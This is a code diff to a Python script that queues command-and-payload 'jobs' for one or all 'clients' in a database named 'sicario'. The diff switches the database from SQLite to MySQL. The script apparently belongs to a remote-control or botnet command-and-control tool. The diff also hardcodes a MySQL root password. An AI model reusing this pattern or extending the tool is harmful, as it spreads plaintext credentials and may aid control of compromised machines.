@@ -3,7 +3,8 @@ from __future__ import print_function
 # And yes, it does not support single clients. One or all. Web UI will have all these fancy gadgets, this is 
 # for developing
 
-import sys, sqlite3
+import pymysql.cursors
+import sys, pymysql
 
 def invalid_parameters ():
 	print('Invalid parameters.')
@@ -33,7 +34,12 @@ def main ():
 		sys.exit(0)
 
 	try:
-		handler = sqlite3.connect('../db/sicario.db')
+		handler = pymysql.connect(host='localhost',
+                             user='root',
+                             password='arafatka1',
+                             db='sicario',
+                             charset='utf8mb4',
+                             cursorclass=pymysql.cursors.DictCursor)
 	except: 
 		print('[*] Connection to database failed!')
 		sys.exit(1)
@@ -41,14 +47,14 @@ def main ():
 	cursor = handler.cursor()
 
 	if clients == 'all':
-		query = cursor.execute('SELECT id, hash FROM clients WHERE 1')
+		query = cursor.execute('SELECT id, userkey FROM clients WHERE 1')
 		clients = cursor.fetchall()
 		clients_len = len(clients)
 		print('{} clients in total. Sending jobs..'.format(clients_len))
 		print('Warning: Do not quit terminal before all jobs will be sent, or no job will be sent.')
 
 		for num, client in enumerate(clients):
-			cursor.execute('INSERT INTO jobs (client_key, type, processed, payload) VALUES (?, ?, 0, ?)', (client[1], command, payload))
+			cursor.execute('INSERT INTO jobs (userkey, type, processed, payload) VALUES (%s, %s, 0, %s)', [client['userkey'], command, payload])
 			print('{}/{} jobs processed.. '.format(num+1, clients_len),end="\r")
 			sys.stdout.flush()
 
@@ -57,7 +63,7 @@ def main ():
 		print('\nAll sent!')
 
 	else:
-		cursor.execute('INSERT INTO jobs (client_key, type, processed, payload) VALUES (?, ?, 0, ?)', (clients, command, payload))
+		cursor.execute('INSERT INTO jobs (userkey, type, processed, payload) VALUES (%s, %s, 0, %s)', [clients, command, payload])
 		handler.commit()
 		handler.close()
 		print('Job sent!')
